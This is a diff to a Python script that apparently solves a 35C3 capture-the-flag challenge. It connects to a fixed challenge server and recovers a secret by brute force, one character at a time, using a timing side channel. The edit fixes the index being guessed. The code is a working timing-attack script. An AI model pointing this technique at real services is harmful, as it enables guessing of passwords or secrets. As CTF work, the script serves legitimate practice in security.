@@ -10,7 +10,7 @@ for j in range(32):
         conn = remote("35.207.158.95", 1337)
 
         list1 = list(payload)
-        list1[31] = i
+        list1[j] = i
         payload = ''.join(list1)
 
         conn.recvuntil(":")
@@ -19,7 +19,7 @@ for j in range(32):
         begin = time.time()
         res = conn.recvall()
         end = time.time()
-
+        
         if "35C3" in res:
             print(res)
 
@@ -27,6 +27,5 @@ for j in range(32):
         if (elapsed > 0.85 + 0.66*(j+1)):
             print(payload)
             print(elapsed)
-            
             break
     
